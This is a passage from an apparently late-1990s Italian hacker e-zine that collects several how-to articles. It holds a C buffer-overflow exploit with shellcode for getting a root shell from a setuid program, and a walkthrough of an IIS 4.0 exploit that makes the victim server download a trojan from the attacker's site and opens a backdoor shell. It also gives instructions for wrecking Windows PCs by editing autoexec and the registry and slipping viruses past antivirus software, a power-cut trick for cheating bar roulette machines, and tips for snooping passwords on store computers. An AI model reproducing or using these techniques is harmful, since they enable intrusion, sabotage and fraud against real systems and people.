Il programma notera' che il ptr e il file insieme non sono + grandi di 1024
quindi cerchera' di eseguire "sprintf" e quando questo succedera' esso sara' +
grande di 1024 e cio' causera' un buffer overflow.
 
:Pp Inanzi tutto dobbiamo predefinire la visibile a qualcosa di + largo di
1024. Lo facciamo ma lo settiamo + grande di 1024 e lo facciamo con un codice
macchina e il comando (/bin/sh). L'esempio usato fara' girare con l'editor
qualsiasi programma settato. Di solito pico...ma + in generale vi. 
Dovremmo quindi scrivere un programma di questo genere:

#include <unistd.h>                     - Vabbu'...si mettono sempre :Pp
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>

#define PATH_CT "/usr/bin/program"      - definiamo la patch del programma
                                        - che vogliamo colpire

u_char shell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";

u_long esp() { __asm__("movl %esp, %eax"); }

-Codice macchina che sara' eseguito quando il programma sara' in overflow
-e che dira' al sistema di eseguire /bin/sh 

main()                  - funzione principale
{                       - apri

u_char buf[2048];       - definisci cosa sara' visibile
u_long addr;            - usato per il codice macchina
int i;                  - usato per i loop

strcpy(buf, "/usr/bin/pico;   ");       - fai partire cio' che sara visualizzato con pico
                                        - cosi' sembrera' normale

addr = esp() - 192;
for (i=16; i<128+16; i+=4)
*((u_long *) (buf+i)) = addr;
for (i=128+16; i<1040; i++)
buf[i] = 0x90;
for (i=0; i<strlen(shell); i++)
buf[1040+i] = shell[i];
buf[1040+i] = '\n';

- applica al codice macchina cio' che sara' visualizzato

setenv("VISUAL", buf,1);        - predefine visual

execl(PATH_CT, "program", "-options", (char *)0);       - esegui il programma
                                                        - con -options

}                               - chiudi


Una volta compilato il programma e lanciato succeddera' cio' :
Partira' pico eseguendo l'inizio del buffer ed una volta usciti il buffer
andra' in overflow ed eseguira' /bin/sh. Se il programma bukato era setuid 0
e nessun cambiamento sara' stato fatto dallo user nel codice esso ci portera'
in una shell da root.

Per trovare un proggie da exploitare dobbiamo per prima cosa avere il suo
sorgente. Esso deve essere un programma che e' usualmente settato con setuid 0
e cercare "sprintfs" dove una variabile definta dallo user di una lunghezza
indefinita e' copiata in una definita.

Articolo concluso......oggi sono stato un po' troppo serio per i miei gusti..
devo tirarmi fuori qualcosa di strano...non sono contento.
Eccola pronta...e' quella maledetta febbre che mi ha assistito e che mi tortura
che in compenso pero' m'ha fatto venir voglia di scrivere 'sto articolozzo.
Vaccuzza la miseriuzza ladruzza.....end!
by
	DanTo Aligo !

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                        -= Exploit per IIS server v 4.0 =-

created by: AX1S

Ciao a tutti i Newbies e non. Sto scrivendo questo articolo perche' molte
persone mi hanno chiesto che cosa fosse il nuovo exploit per Microsoft IIS
Server v 4.0. Beh, e' un bell'exploit!!! ;) Nel momento in cui scrivo quasi
tutti i server sono vulnerabili.

CHE COSA FA?

Questo simpatico programmello sfrutta un bug del web server di Windows NT.
E' infatti in grado di far crashare il demone http e di eseguire sulla
macchina alcune righe di codice. In pratica riusciamo a mettere un trojan
su quel server ed a farlo eseguire. L'exploit infatti provoca il crash solo
del demone http e non di tutta la macchina.

CHE COSA MI SERVE??

- L'exploit compilato
- un trojan che vada bene per Win NT
- un vostro sito web
- il server vittima (ovvio no?)             

ok, per quanto riguarda l'exploit compilato lo trovate tra gli allegati in
questo numero di newbies. In giro sulla rete c'e' solo il sorgente in
assembler ma reperire il TASM per compilarlo e' relativamente difficile. Di
trojan che vanno bene per NT, invece, ce ne sono moltissimi su internet, in
primo Netbus. Io pero' vi consiglio il trojan che viene utilizzato come
esempio dai creatori dell'exploit, cioe' ncx.exe. Lo potete trovare facilmente
su www.technotronic.com alla sezione Microsoft. Ncx.exe e' un trojan piccolo
piccolo (solo 31k contro gli oltre 400k di netbus) che vi consente di
ottenere una shell MSDOS sul sistema vittima: basta che vi connettiate
alla porta 80 del server ed avete accesso libero! (se scaricate ncx99.exe
la porta a cui vi dovete connettere e' la 99).
Ora viene il momento di parlare del vostro sito web. A cosa vi serve? Beh,
semplicemente a metterci sopra il trojan: uploadate il trojan sul sito. Per
quanto riguarda il server vittima basta che sia un Windows NT e che monti
IIS Server v 4.0.

USIAMO L'EXPLOIT!

Bene, veniamo al dunque.

Exploit  --> iishack.exe
Trojan   --> ncx99.exe
Sito web --> www.miosito.com
Vittima  --> www.target.com

Incominciamo:
aprite il vostro prompt del dos e posizionatevi nella directory dove avete
l'exploit. (nel mio caso C:\)
ok, ora basta scrivere:

C:\iishack www.target.com 80 www.miosito.com/ncx99.exe

80 e' la porta dove e' in ascolto il demone http del server vittima.
Ricordatevi di non mettere "http://" davanti agli indirizzi!!!

Adesso aspettate qualke secondo in modo che il trojan venga scaricato sul
server vittima e poi digitate

telnet www.target.com 99

WOW! siamo dentro! ora sta tutto alla vostra fantasia. :))

Un saluto a tutti quelli di newbies ed a tutti gli SPP. :)

AX1S

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%% COME FAR DIRE IL ROSARIO ALL'UTENTE DI WINDOWS %%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

Consumo: Aria + acqua
Musica ascoltata: MTV Kitchen + 
Saluti: al sempre mio + grande amico Bug Gates e al suo sistema operativo
        che e' piu' vicino ad un allevamento di vermi che a un OS.
Dediche: alla mia amica Marzela, che dovrebbe lasciar stare quel nanetto
        che si diverte a dirsi grande hacker solo perche' sa usare nuke e
	che crede che una shell sia il distributore sotto casa... :))))

============================ DISCLAIMER ===================================
Il materiale seguente e' a solo scopo informativo, non mi riterro'
responsabile dei danni che farete sui computer altrui o, se siete stupidi,
sui vostri. Ricordatevi: Io non c'ero, non ho fatto niente, non ho visto
niente e se c'ero stavo trombando !! :)))))
============================================================================

Salve a tutti. Chissa' quante volte avrete pensato a come sarebbe
divertente vedere il nostro lamerone di turno che usa Winkaz iniziare a
dire il rosario a causa del solito schermo blu o ad una delle tante
inchiodate di questo fanatastico OS. Bene in questo articoletto cerchero'
di spiegarvi come dargli una mano a diventare un buon cristiano.

PUNTO 1: I FILE DI AVVIO

Prima ancora del caricamento vero e proprio di Winspazzatura il computer
cerca nella directory di C:\ due file indispensabili che gli servono per
l'avvio: l'autoexec.bat e il config.sys . Vedo gia' i vostri occhi che si
illuminano. Infatti provate a dire cosa potrebbe succedere se li
modificate un po' o, ancora + bastardamente, li eliminate del tutto ? Il
caro Winshit non parte e il nostro caro utente dovra' spendere 100 carte da
mille dal tecnico di fiducia per riparare il danno. Se invece siete
bastardi ma non fino a questo punto bastera' creare un file contenente le
seguenti righe e chiamarlo ad es. fuck.bat con un editor:
---- cut ----
md fuck
cd fuck
fuck.bat
---- cut ----

aggiungete poi all'autoexec.bat una riga con scritto "fuck.bat" (senza gli
apici) e il povero utente al successivo avvio vedra partire un ciclo
infinito di inscatolamento di directory e anche qua sono almeno 100.000
che partono.

PUNTO 2: LE DIRECTORY FONDAMENTALI

Nel nostro amato OS ci sono almeno due cartelle che sono fondamentali per
il suo funzionamento. Come avrete apito sto parlando di C:\WINDOWS e di
C:\WINDOWS\SYSTEM . Pensate ora a cosa succede se ritocchiamo un po'
queste dir..... il caro Winpattumiera non si avviera' o dara' un fracco di
errori x la mancanza dei file. Una cosa elementare da fare e' rinominare le
dir, questo pero' e' abbastanza facile da rimediare in quanto il nostro
lamerone riavvierebbe in modalita' ms-dos e potrebbe rimettere a posto le
cose. Se invece ni ci sentiamo molto bastardi bastera' guardarsi una
tabella dei codici ascii e trovare il carattere "blank" ,quello invisibile.
Rinominate la dir lasciando uguale il nome ma aggiungendo il carattere
sopracitato. Adesso voglio vedere il nostro amicone quando all'avvio
leggera' "file o cartella inesistente" e facendo un C:\>dir notera' che la
cartella e' al suo posto.... Se invece non siete amanti delle finezze fate
tabula rasa delle dir... e avrete un nuovo amico cattolico. :)))))

PUNTO 3: IL REGISTRO DI CONFIGURAZIONE

Come spero saprete il caro Winpollo ha tutte le info che gli servono per
andare in un file chiamato registro di configurazione. Anche qui ci sono
diversi modi per uccidere il caro OS. Oltre alla banale cancellazione del
file, cosa efficace ma senza stile, si puo' navigare tra le chiavi con il
REGEDIT fino a trovare il punto in cui ci sono le assegnazioni dei tipi di
file ai programmi (cioe' .mp3 a Winamp, .bmp al Paint, .doc a Word etc.
etc. ), cercate la chiave di assegnazione degli .exe e cambiatela a vostro
piacere, indirizzandolo verso un altro prog che non sia l'explorer. In
questo modo Wingallina quando cerchera' di far partire un eseguibile
chiamera' il programma che gli avete detto e qui si piantera' perche' non
riesce ad avviarlo. Se il nostro utente volesse poi mettere a posto le
cose non potra' perche' il REGEDIT e un .exe e non si avviera' manco a
pagarlo: un altro cristiano in chiesa con 500.000 in meno nel suo 
portafoglio.

PUNTO 4: VIRII & COMPANY

Volete mettergli un bel virus pero' il vostro caro amico ha uno di quei
fantastici tool che si caricano in memoria all'avvio ? Niente di piu'
facile da bypassare. Infatti questi cari antivirus si caricano durante la
sequenza di avvio con una riga inserita nell'AUTOEXEC.bat quindi se voi
mettete il collegamento al virus prima della chiamata all'antivirus... il
gioco e' fatto ! Se siete degli abili programmatori potreste anche simulare
il caricamento dell'antivirus in modo che non si carichi un tubo se non il
vostro viruz. Se avete una buona immaginazione avrete capito che in questa
maniera gli potrete caricare in memoria tutti i trojan che volete senza
che nessuno se ne accorga.....

Bene per stavolta e' tutto... per qualsiasi problema mandate una e-mail a 
the1n7rud3r@freemail.it e ricordate: LINUX RULEZ !!!!!! :))))

by The_Intruder

############################################################################### 
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
NOTA BY N0bodY88 = il seguente file lo pubblichiamo con il permesso del
                   l'autore (Jenji) e ovviamente del grande Avatar666 (abbiamo
                   chiesto anke lui dato che tale file faceva e fa tuttora
                   parte del Cookbook di Avatar che potete trovare sul sito
                   degli Spaghetti Phreakers (colgo l'occasione x salutare
                   Harlock e Blinking e tutta la crew del nuovo LUG della
                   loro citta', CDP (detto l'onnipresente) e ovviamente il
                   (poco visto purtroppo) mito Blum (xche' non rispondi alle
                   mie mail???).
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                  ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                  ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                  ÷³     BUG DELLE ROULETTE DA BAR     ³÷
                  ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                  ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

N.B. QUESTO FILE E' DA RITENERSI A TITOLO PURAMENTE INFORMATIVO, PERCIO'
     IO, AVATAR, DECLINO OGNI RESPONSABILITA' DALL'USO CHE POTREBBE
     ESSERNE FATTO. NON INCORAGGIO, DUNQUE, CHI VOLESSE SERVIRSENE PER
     SCOPI ILLEGALI. STESSA COSA VALE X I REDATTORI DI NEWBIES E TUTTO
     IL NEWBIES STAFF
u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'
     IL POSSESSO DI QUESTO FILE E' COMUNQUE DEL TUTTO LECITO.

u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'

-!!!- BUG DELLE 'ROULETTE DA BAR' -!!!-
u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'u'

Autore:           Jenjy
Consumo:          3 ore di sonno, 3 bicchierini di limoncino.
Musica Ascoltata: Black Sabbath, Iron Maiden, Metallica.
Saluti a:         Lo pi', Zoe, Gianni, Fantaman,Falasco',Giorgio D, e 
                  UN SALUTO SPECIALE A SILVIA C. di Jesy.

Da circa un anno a questa parte, i bar e le sale giochi sono caratterizzate
dalle ormai consuete macchinette da gioco. In particolare Slot-machine, Poker
e ROULETTE elettroniche. Voglio parlarvi proprio di quest'ultime.

Il funzionamento e' abbastanza semplice, ma per chi non ne fosse a conoscenza
lo spieghero'. La roulette accetta soldi 1000, 5000, 10000, 50000.
Ad esempio quella dal caffe' sotto casa trasforma le 10000 Lire in 100
punti giocabili.

Dopo aver puntato la somma o una parte di essa, si puo' decidere di ritirare
il premio sottoforma di Ticket, che si possono cambiare dal gestore del bar
in denaro o Consumazioni. Questi Ticket escono da una fessura in basso al
gioco.

Volete vincere un po' di soldi in maniera facile ?????

Seguitemi con attenzione !!!!

Inserite 10000 Lire nella macchinetta.
Ora puntate la meta' dei vostri punti sul colore Rosso, e l'altra meta' sul
colore Nero. In entrambi dei casi (Tranne che nel verde) ritornerete al punto
di partenza, con i vostri bei 100 crediti (10000 Lire) sul display.
Adesso verra' la scritta "VUOI RITIRARE IL PREMIO ORA?" spostate il Joystick
sul SI ma non premete niente.
Adesso cercate l'interruttore per far spegnere la Roulette (di solito SOPRA
il gioco). Adesso  (ATTENZIONE !!!!)
Premete SI e IMMEDIATAMENTE dopo spegnete la macchina !!!
Intanto avete ritirato il vostro bravo TICKET !!!!!!!!

Quando dico IMMEDIATAMENTE intendo dire CONTEMPORANEAMENTE dopo aver premuto
SI.

Ora riaccendete la macchina. Essa dopo aver fatto il test video e dei colori
ricarichera' il gioco !!!! E, MAGIA, ci sono ancora i vostri 100 punti !!!!! ;)

Qualcuno di voi pensera' "Ma non li avevamo ritirati prima ?"
Dopo ne riparleremo.

I 100 punti che avete sono "VIRTUALI" ossia non potete Ritirarli, ma potete
sempre giocarli per tentar di vincere ancora !!!!

Qui dovete aver un po' di culo e dovete saper amministrare il gioco e i
rispettivi punti !!!

Quando arriverete a 200 punti o piu' e ritornera' la scritta per il ritiro
del premio ora ritirate normalmente dicendo di SI.
Ritirerete il punteggio sul display - i 100 punti virtuali.
Ad esempio se sul Display c'e' scritto 400 punti (40000 Lire) ritirerete
solamente 300 punti ossia 30000 Lire, perche' come dicevamo prima i 100 punti
sono virtuali, ossia non potete ritirarli, ma potete sempre puntarli per
vincere altri punti che poi pero' potranno essere ritirati.


                           >Spiegazione DETTAGLIATA<
      <BUG del Software "Les Fiches" Ossia del software della roulette.>

Dopo circa 3 giorni di studi sono arrivato a una conclusione.

Innanzitutto premetto che la macchinetta e' provvista di una memoria EEPROM
su cui vengono salvati il punteggio ad ogni variare di esso, per non venire
incontro a inconvenienti del tipo se va via la tensione.
Ad ogni accensione della macchinetta tramite l'apposito interruttore. Il
software carica dalla EEPROM il punteggio. Fino a qui tutto OK.
Cio che e' molto interessante e' la priorita' che il software assegna a due
diverse procedure durante il ritiro del premio.
Queste due procedure sono rispettivamente LA FUORIUSCITA DEI TICKET e la
CANCELLAZIONE DEI PUNTI DALLA MEMORIA.
La gestione delle due vengono eseguite in fattore del tempo nella sequenza
sopraccitata.

Avendo un tempo di qualche centesimo di secondo tra la prima e la seconda
operazione, togliendo tensione impediamo che il software vada a cancellare il
punteggio della memoria EEPROM.

L'errore e' di tipo concettuale , ossia l'esecuzione errata delle due
procedure da parte del software.

Be' ringraziamo i Programmatori !!!!!!!!!! :)

PS: Ultimamente ci sono in giro macchinette "Les Fiches", in cui per ritirare
    il premio, dovete effettuare un piccolo giochino tipo SPACE INVADERS, per
    ritirare il premio, in cui i punti vengono decrementati un po' alla volta.
    Mi dispiace per voi, ma non credo che con questo metodo, la macchinetta
    sia Exploitabile. :(

Io personalmente in un giorno ci ho rimediato 40000 Lire.
Non sono miliardario ora, ma fanno sempre comodo 40 sacchi in tasca. ;)

Vi ricordo che mi interesso anche di Phreaking, Hacking, Viring e Cracking.

Se volete contattarmi potete farlo presso il mio indirizzo E-Mail:
marco2@cronosnet.com

GRAZIE A "Jenji",
  L'AUTORE DI
 QUESTO FILE...

      by
  ֵ        ֵ
  ³ AVA666 ³
  u'u'u'u'u'u'u'u'u'u'

PS: grazie ancora a Jenji ed Avatar forever our friends :D

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                          ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                          ÷ִִִִִִִִִִִִִִִִִ¿÷
                          ÷³     FOTTING     ³÷
                          ÷ְִִִִִִִִִִִִִִִִִ÷
                          ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Autore: mR_bIs0n
Consumo: ho appena finito di pranzare...
Musica ascoltata: Marilyn Manson - Antichrist Superstar - The Album
                  RadioHead - Karma Police (live)
                  Jamiroquai - Canned Heat
                  Vengaboys - Varie...
                  Shania Twain - That Don't Impress Me Much
Tempo atmosferico: nuvoloso
Alla Playstation: mio fratello
Alla TV: Bim Bum Bam - "Holly e Benje" (quelli ke giocano in collina in un
         campo di forse 3 km) quando ho iniziato... quando ho finito stanno
         facendo "Sei un bravo pescatore, Sakura" o qualkosa di simile...
-----------------------------------------------------------------------------
Enjoy Auchan and IperCoop e roba varia

cARISS... O KAZZ...
Scusate avevo lasciato il caps lock premuto... capita!
Allora dove eravamo rimasti? Mi pare ke stavamo parlando delle tette vero?
Ah no!

Carissimi accaniti lettori di Newbies, ho scritto questo articolo informativo
per raccontarvi, dopo lunghissime esperienze, come divertirsi nei grandi
magazzini come l'Auchan e l'IperCoop, mega-mercati che credo ce ne siano
in tutta l'Italia!!!
-----------------------------------------------------------------------------
Bene, i vostri carissimi genitori vi hanno convinto (o costretto) a seguirli
al centro per andare in un Mega-Iper-Mercato... non scoraggiatevi potete
divertirti un mondo! Come? Continuate a leggere...

-Computer Parte 1
Di solito, in ogni IperMercato ke si rispetti c' una sezione dedicata
all'informatica, con dei computer esposti e accesi, e talvolta dotati di
modem e connessione ad Internet...
Bene bene... per la maggior parte dei casi i rivenditori hanno attivato
lo screen saver ai pc... con relativa password di protezione... oppure il
computer pu• trovarsi ancora in partenza con l'attesa della password del bios.
Oki, per prima cosa bisogna sapere che chi si okkupa dei pc non  un tecnico
ma bensi un rivenditore coglione, quindi se ha messo lui una password, deve
pur essergli famigliare, visto la ridotta capacit… mentale, e molte volte la
pass coincide con il proprio nome. Allora voi chiedete informazioni ad un
assistente l vicino per spiare il cartellino di riconoscimento che porta
nel taschino della camicia... oki, ora avete dei dati... provate a immettere
il nome o il cognome o tutti e due del coglione di turno... alla pass dello
screen saver non va bene? No problem, resettate il pc col tastino sulla case
e aspettate la pass del bios... se neanche quella pass va bene, non
scoraggiatevi... aspettate l vicino... sicuramente un interessato al pc si
fermer… e vorr… vedere il pc... l'assistente demente digiter… la pass e voi
spierete bene bene cosa digita... naturalmente dopo per non dare nell'occhio
direte indicando SOLO il monitor: "Questo  un computer Windows98??? Il mio
amico ha un computer Windows95...", attenzione a non dire "Questo  solo il
monitor e questo  un pc con un sistema operativo quale MicroSoft Windows95".
Bene ora avendo una pass vi allontanate per un po'...
*Aspettate la parte seconda per sapere cosa fare dopo...*

-Scherzetti vari
Vi allontanate dall'area informatica... e vedete un pervertito travestito da
cellulare della OmniTel che regala cappellini e che respira affannosamente...
un classico... bene prima di tutto vedete di procurarvi un largo pezzo di
carta (io di solito strappo dei quaderni), un bel pennarello (chiss… perk se
aprite un astuccio per penne  sempre incompleto...) e un pezzo di scotch
(ancke quello  facilmente trafugabile nell'area cartoleria...).
Ora, il pervertito OmniTel, non pu• accorgersi facilmente di ci• che gli
viene appicicato nella parte toracica e in quella della schiena... bene
scrivete qualcosa tipo "Calciatemi", "Sono un pervertito",... e perparate lo
scotch attaccandolo un p• sul pezzo di carta... fate finta di inciampare
oppure di allacciarvi un laccio della scarpa oppure ancora di toccare il
mentecatto per colpa della confusione e attaccategli il foglio di carta o
sulla schiena o sul torace... un bell'effetto  se ci scrivete "Attenti!
Non avvicinate i bambini" o meglio ancora se dietro c'ha scritto "Persone
in grado di cambiare il mondo" e voi ci mettete "...in peggio!!!".
Non vi siete ancora divertiti abbastanza??? Oki, trafugate ora un po' di
colla tipo "Attak" o comunque trasparente (non come quella vinilica). Bene
andate nel reparto ortofrutticolo... di solito ci sono dei guanti fatti di
polietilene trasparente, ke si indossano per prendere la verdura o la frutta.
Ora prendetene un paio e metteteci dentro un po' di Attak... e riponeteli con
cura...
Ora tornate al reparto informatica...

-Computer Parte 2
Vi avvicinate disinvolti al pc, inserite la pass... la primissima cosa che
dovete fare  cambiare screen saver con un altra pass... poi rimettere il pc
con lo screen saver e pensate bene cosa fare... io di solito aspetto che...
*Per sapere cosa faccio io dopo di solito dovete leggere la prossima*
*sezione...*

-Oh, poveri dementi...
La cosa ke odio di pi— quando mi trovo vicino ai pc ad un grande magazzino 
un'orda di dementi e mentacatti, quali bambocci e adulti, che si avvicina ai
pc o per fottere (rimanendo fottuti) o per dire cavololate...

   -Primo caso - I lussiriosi
Si avvicina al pc un grossiccio, lardiccio, nutelliccio, caramelliccio,
sudaticcio, appiccicaticcio di bambino con un seguito di altri bambocci...
il leader escalama: "Un computer! Andiamo a giocare ai videogiochi!!!"
Che cazzo di gioco vorresti trovare su di un Hard Disk quasi vuoto con il
solo sistema operativo??? Razza di coglione, l'unico gioco presente su quel
HD che sfrutta tutti i 16,8 milioni di colori di una scheda grafica ke si
rispetti  CampoMinato della MicroSoft!!! E allora giocaci fetente!!!

 -Secondo caso - Gli esaltati
Si avvicina al pc una coppietta di fidanzatini... il ragazzo esclama dopo
aver visto di non conoscere la pass dello screen saver: "Vedi cara, qui
hanno messo un protezione con la PAROLA CHIAVE... se conoscessimo il CODICE
D'ACCESSO potremo entrare nella BANCA DATI della BANCA ITALIANA...e farci
un nostro conto con un MILIARDO... " e la dolce donzella ancora pi— demente
del ragazzo: "Oh, caro tu si ke sai tutto!"
Sai tutto? Sai tutto un corno! Brutto esaltato mentale che non sei altro,
schifoso merdoso ti sei visto forse troppo War Games degli anni '80???
E tu altra mentecatta, non vedi che stai affianco ad un sparaballe a
pagamento??? Andate a farvi fottere tutti quanti...

 -Terzo caso - I fetenti
Si avvicina al pc un'altra orda di ragazzi... pi— grandi dei precedenti ma
non meno dementi... il pi— cretino dice ad un altro: "Ora mettiamo la pass
e inseriamo un virus!!! AHAHAH!!! E dopo facciamo partire un gioco!!!".
L'altro forse un po'meno esaltato gli risponde: "Dove lo trovi il virus? E il
gioco?". Il fetentone gli dice allora: "Il virus c' lo da Window (da notare
ke io non ho dimenticato la 's' finale)! Noi copiamo un file in un dischetto
e allora si infetta con il virus, e sul dischetto esce un MARCHIO...
E per il gioco io ne ho scoperti tanti nel mio computer!!! Sopprattutto nella
directory 'C:\giochi\'... e dopo li PROGRAMMIAMO in un dischetto... forse c'
dentro DOOM II, un gioco bellissimo che  3D..."
Come? Come? Cosa vuoi fare tu? Vuoi mettere un virus nel computer? Ed esce
un marchio sul dischetto??? E i giochi tu li scopri nella cartella
'giochi'??? E poi vuoi "programmare" un gioco come DOOM II su di un solo
dischetto??? Ma insomma che KAZZO STAI DICENDO??? Sbaglio o sei un deviato
mentale??? Hai avuto un infanzia crudele a quanto vedo...

 -Quarto caso - I violenti
Si avvicinano al pc dei bambini sui 10 anni circa... con loro c' anke un
bimbo sugli 6 anni (qui bisogna leggere con sguardo pieno di tenerezza)
che, biricchino, con una mano stringe quella del fratello pi— grande e con
l'altra si diverte a darsi scossette ripetute, interponendo la punta della
lingua tra i due poli di una batteria a 9 volt, oggetto per lui, di culto
e anche sadomaso... (contento lui...) cosa ci vuoi fare... sono cos dolci
i bimbi... (e qui potete terminare di fare lo sguardo pieno di tenerezza...).
I bambini pi— grandi cominciano a invadere la tastiera premendo quanti pi—
possibili tasti, e nel frattempo usano il mouse come attrezzo per colpire
il compagno di giochi... c' anche chi si diletta ad aprire e chiudere il
lettore del CD-Rom, mentre il monitor, lentamente ma inesorabilmente,
comincia a dondolare pericolosamente... pian piano il pc viene assalito e
divorato dai malefici bambini... per esso non esiste pi— speranza...
rabbrividiamo...
Dopo aver concluso il loro rito satanico, i bambini lentamente scompaiono...
del povero computer non  rimasto molto...

-Computer Parte 3
Bene, dopo aver cacciato la gente indesiderata, mettiamo la nostra pass allo
screen saver e vediamo cosa ci offre il pc... di solito un pc dei tanti
esposti ha una connessione ad Internet... bene non ci resta ke accertarcene e
vedere se gli zoticoni di rivenditori hanno lasciato la scelta
"Salva password"... se non  attivata l'opzione allora non ci resta ke
aspettare e vedere bene quando si connette qualcuno ke conosce la pass...
potete sempre farvi un giro nell'hard disk per scovare un fantomatico
"pass e user per la connessione ad internet.txt" per avere tutti i dati per
poter avere l'accesso...
Se siete cattivi potete sempre lasciare un bello sfondo con scritto: "Vi sar…
difficile indovinare la pass del bios... fottetevi..." naturalmente cambiare
la supervisor password del bios  opzionale, potete far anche solo
spaventare il rivenditore... io personalente lascio sempre o dei file HTML
scritti sul momento o txt con tante stronzate... ma  divertente anke lasciare
dei bei screen saver con testo scorrevole tipo: "mR_bIs0n vi ha fottuto il
pc... siete tutti dei dementi perversi..." o se magari l c' una bella
ragazza con due poppe grandi come due angurie: "Ei tu, si proprio tu ke stai
leggendo vorresti conoscere un bel ragazzo tipo Brad Pitt? Bene io non lo
sono... sono meglio!!!!"( e questo smentisce ke tutti gli smanettoni ai pc
siano dei buffi tipi col camice bianco, un paio di occhiali con lenti tipo
culo di bottiglia...)e poi entrate nel pc come dei veri padroni... forse
capir… che quello meglio di Brad Pitt siete voi e vi far…, forse e sempre
forse, qualche domanda... (a me  successo, ma l'intento della ragazza era
quello di sentirsi gli mp3 ke c'erano nell'hard disk... uuhuh non sono meglio
di Brad...) sperate anke ke in quel preciso momento non passi di l una
bruttona, grassona, ecc.. ed allora scappate...
Comunque gli usi sono tantissimissimissimissimi... fate ci• ke vi pare...

-----------------------------------------------------------------------------
Conclusione e saluti vari

Ahhh finalmente  finito!!! Ke pakkia non ho nemmeno compiti da fare... ohh
aspe'ho da fare Latino... vabb comunque... poi si copia in classe...

Vorrei dirvi ke se troverete degli errori o delle cose ke secondo voi non
sono giuste, NON ME NE FOTTE UN CAZZO... :)) scherzo!

Vorrei salutare le seguenti persone con tanto di commenti:

Mr_Skull: un caro amico ke mi spiega tante cose utili tipo lavarsi le mani
dopo essere andato al cesso e roba simile... ah anke perk spesso non mi dice
ke abbiamo compiti da fare per casa... cos ho la scusante con la prof...

Pankrazio: vekkio amico di lamerate quando eravamo ancora allo stato
primordiale... CIAO e vacci piano con la gente... ehehe

Amicus: un gran bravo ragazzo (mi scappa da ridere... basta non dico altro...
        chiedete a Skull...)

la Sandra: ke continua sempre ad andersene in giro con Francesco (dovr•
           detonarlo un giorno o l'altro...) e non con me... ARGHHHHHH

la Federica: ke alla fine si akkorger… di essere troppo piccola per il suo
             ragazzo...

la Daniela: ke spero cambi testa... ed  comunque carina e simpatica

il Davide: ke mi fa scoppiare dal ridere... buazbuazbuaz

lu Peppu: ke tira sempre botte e fa il prepotentone...

una ragazza ke mi guarda e sorride ogni volta ke esko da scuola: ciao carina!

Dedicato a:
tutte le belle ragazze ke konosco e ke stanno leggendo qui!!!

mR_bIs0n
mr_bison@libero.it


ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

